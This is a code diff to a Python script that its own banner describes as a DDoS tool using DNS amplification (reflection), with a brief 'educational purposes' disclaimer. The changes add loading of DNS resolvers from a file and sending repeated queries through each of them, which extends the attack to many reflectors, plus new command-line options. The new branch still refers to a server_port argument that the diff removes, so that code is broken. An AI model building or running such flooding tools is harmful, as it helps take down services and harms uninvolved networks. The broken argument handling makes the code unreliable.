@@ -3,16 +3,22 @@ import threading
 import time
 import argparse
 
+def get_resolvers_from_file(file_path):
+    with open(file_path, 'r') as file:
+        resolvers = [line.strip() for line in file.readlines()]
+    return resolvers
+
+def send_queries_through_resolvers(domain, resolvers, server_port, num_queries, interval, verbose):
+    for resolver in resolvers:
+        send_multiple_queries(domain, resolver, server_port, num_queries, interval, verbose)
+
 def get_address_port():
     address = input("Enter server address: ")
     port = int(input("Enter server port: "))
     return address, port
 
 def send_dns_query(domain_name, dns_server_address, dns_server_port, interval, verbose):
-    # crafting a UDP socket for each thread
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-    # storing DNS server address and port number
     server_address = (dns_server_address, dns_server_port)
 
     try:
@@ -70,20 +76,22 @@ def display_banner():
     print("Script to perform DDoS using DNS amplification (reflection) technique.")
     print("It was created for educational purposes. Please don't misuse it for illegal activities.")
     print("Usage:")
-    print("  python script_name.py <domain> <server_address> <server_port> <num_queries> <interval> [-v/--verbose]\n")
+    print(" python ./poc2.py -f resolvers.txt <domain> <server_address> <server_port> <num_queries> <interval> [-v/--verbose]\n")
     print("Options:")
     print("  domain            Domain name to query")
+    print("  -f                DNS Resolvers txt file")
     print("  server_address    DNS server address")
-    print("  server_port       DNS server port")
+    print("  -p or --port      DNS server port")
     print("  num_queries       Number of queries to send")
     print("  interval          Interval between queries in seconds")
-    print("  -v/--verbose      Enable verbose mode (optional)\n")
+    print("  -v or --verbose   Enable verbose mode (optional)\n")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='DNS query sender')
     parser.add_argument('domain', nargs='?', type=str, help='Domain name to query')
+    parser.add_argument('-f', '--file', type=str, help='Path to the file containging DNS resolver addresses')
     parser.add_argument('server_address', nargs='?', type=str, help='DNS server address')
-    parser.add_argument('server_port', nargs='?', type=int, help='DNS server port')
+    parser.add_argument('-p', '--port', type=int, help='DNS server port')
     parser.add_argument('num_queries', nargs='?', type=int, help='Number of queries to send')
     parser.add_argument('interval', nargs='?', type=float, help='Interval between queries in seconds')
     parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')
@@ -92,5 +100,9 @@ if __name__ == "__main__":
 
     if not any(vars(args).values()):
         display_banner()
-    else:
+    elif args.file and args.port:
+        resolvers=get_resolvers_from_file(args.file)
+        send_queries_through_resolvers(args.domain, resolvers, args.port, args.num_queries, args.interval, args.verbose)
         send_multiple_queries(args.domain, args.server_address, args.server_port, args.num_queries, args.interval, args.verbose)
+    else:
+         print("Please provide a file containing DNS resolver addresses using -f/--file and specify the DNS server port using -p/--port.")
